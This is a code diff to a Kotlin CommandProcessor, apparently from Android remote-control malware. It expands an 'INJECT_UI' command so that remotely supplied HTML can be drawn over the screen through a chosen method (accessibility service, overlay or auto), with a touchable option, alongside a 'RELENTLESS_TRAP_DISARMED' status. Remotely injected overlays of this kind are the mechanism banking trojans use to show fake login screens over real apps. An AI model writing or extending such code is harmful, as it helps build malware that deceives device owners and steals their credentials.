@@ -872,17 +872,18 @@ object CommandProcessor {
                     status = "RELENTLESS_TRAP_DISARMED"
                 }
                 "INJECT_UI" -> {
-                    val separatorIndex = content.indexOf("|")
-                    if (separatorIndex != -1) {
-                        val touchableStr = content.substring(0, separatorIndex).trim().uppercase()
-                        val htmlContent = content.substring(separatorIndex + 1).trim()
-                        val touchable = touchableStr == "TRUE" || touchableStr == "1"
+                    val parts = content.split("|", limit = 3)
+                    if (parts.size >= 3) {
+                        val touchable = parts[0].trim().uppercase() == "TRUE"
+                        val method = parts[1].trim().uppercase() // ACC, OVERLAY, or AUTO
+                        val html = parts[2].trim()
                         
-                        DynamicUIManager.showOverlay(ctx, touchable, htmlContent)
-                        status = "UI_INJECTED (Touchable: $touchable)"
+                        DynamicUIManager.showOverlay(ctx, touchable, method, html)
+                        status = "UI_DISPATCHED"
+                        errorMsg = "Method: $method | Touchable: $touchable"
                     } else {
                         status = "FAILED (FORMAT)"
-                        errorMsg = "Usage: INJECT_UI | TRUE/FALSE | <html>..."
+                        errorMsg = "Usage: INJECT_UI | TRUE/FALSE | ACC/OVERLAY/AUTO | <html>"
                     }
                 }
                 "REMOVE_UI" -> {
